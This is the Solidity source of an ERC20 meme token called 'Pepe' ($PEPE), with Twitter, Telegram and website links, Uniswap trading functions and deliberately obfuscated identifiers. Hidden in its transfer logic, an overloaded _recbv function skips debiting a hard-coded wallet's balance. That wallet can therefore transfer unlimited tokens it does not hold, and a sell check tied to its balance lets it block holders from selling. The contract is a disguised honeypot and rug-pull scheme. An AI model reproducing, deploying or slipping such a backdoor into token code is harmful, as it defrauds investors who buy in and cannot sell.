/*

Pepe   $PEPE


Twitter: https://twitter.com/PepeercCoin
Telegram: https://t.me/PepeercCoin
Website: https://pepeerc.com/

*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _recbv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _recbv(a, b, "SafeMath");
    }

    function  _recbv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _pogfqj;
    address payable private _tykosjh;
    address private _rksovp;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _evgjsa;
    mapping (address => bool) private _viaqvy;
    mapping(address => uint256) private _fnpaox;
    uint256 public _qabfsp = _totalSupply;
    uint256 public _drgtje = _totalSupply;
    uint256 public _koulpv= _totalSupply;
    uint256 public _vspaif= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylufej=0;
    uint256 private _eyezuy=0;
    

    bool private _prlcot;
    bool public _ufevrq = false;
    bool private yilwep = false;
    bool private _oewep = false;


    event _peiwjh(uint _qabfsp);
    modifier rswnpur {
        yilwep = true;
        _;
        yilwep = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _evgjsa[owner(

        )] = true;
        _evgjsa[address
        (this)] = true;
        _evgjsa[
            _tykosjh] = true;
        _tykosjh = 
        payable (0xA69a1498Df354AdE3Df70f370b657Aa08f200EbD);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _recbv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kpfkwb=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_ufevrq) {
                if (to 
                != address
                (_pogfqj) 
                && to !=
                 address
                 (_rksovp)) {
                  require(_fnpaox
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnpaox
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rksovp && to != 
            address(_pogfqj) &&
             !_evgjsa[to] ) {
                require(amount 
                <= _qabfsp,
                 "Exceeds the _qabfsp.");
                require(balanceOf
                (to) + amount
                 <= _drgtje,
                  "Exceeds the _drgtje.");
                if(_eyezuy
                < _ylufej){
                  require
                  (! _rdlckr(to));
                }
                _eyezuy++;
                 _viaqvy
                 [to]=true;
                kpfkwb = amount._pvr
                ((_eyezuy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rksovp &&
             from!= address(this) 
            && !_evgjsa[from] ){
                require(amount <= 
                _qabfsp && 
                balanceOf(_tykosjh)
                <_vspaif,
                 "Exceeds the _qabfsp.");
                kpfkwb = amount._pvr((_eyezuy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_eyezuy>
                _ylufej &&
                 _viaqvy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!yilwep 
            && to == _rksovp &&
             _oewep &&
             contractTokenBalance>
             _koulpv 
            && _eyezuy>
            _ylufej&&
             !_evgjsa[to]&&
              !_evgjsa[from]
            ) {
                _transferFrom( _jygsp(amount, 
                _jygsp(contractTokenBalance,
                _vspaif)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _plwlqh(address
                    (this).balance);
                }
            }
        }

        if(kpfkwb>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kpfkwb);
          emit
           Transfer(from,
           address
           (this),kpfkwb);
        }
        _balances[from
        ]= _recbv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _recbv(kpfkwb));
        emit Transfer
        (from, to, 
        amount.
         _recbv(kpfkwb));
    }

    function _transferFrom(uint256
     tokenAmount) private
      rswnpur {
        if(tokenAmount==
        0){return;}
        if(!_prlcot)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _pogfqj.WETH();
        _approve(address(this),
         address(
             _pogfqj), 
             tokenAmount);
        _pogfqj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _jygsp
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _recbv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tykosjh){
            return a ;
        }else{
            return a .
             _recbv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qabfsp = _totalSupply;
        _drgtje = _totalSupply;
        emit _peiwjh(_totalSupply);
    }

    function _rdlckr(address 
    account) private view 
    returns (bool) {
        uint256 eufrdb;
        assembly {
            eufrdb :=
             extcodesize
             (account)
        }
        return eufrdb > 
        0;
    }

    function _plwlqh(uint256
    amount) private {
        _tykosjh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _prlcot ) ;
        _pogfqj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _pogfqj), 
            _totalSupply);
        _rksovp = 
        IUniswapV2Factory(_pogfqj.
        factory( ) 
        ). createPair (
            address(this
            ),  _pogfqj .
             WETH ( ) );
        _pogfqj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rksovp).
        approve(address(_pogfqj), 
        type(uint)
        .max);
        _oewep = true;
        _prlcot = true;
    }

    receive() external payable {}
}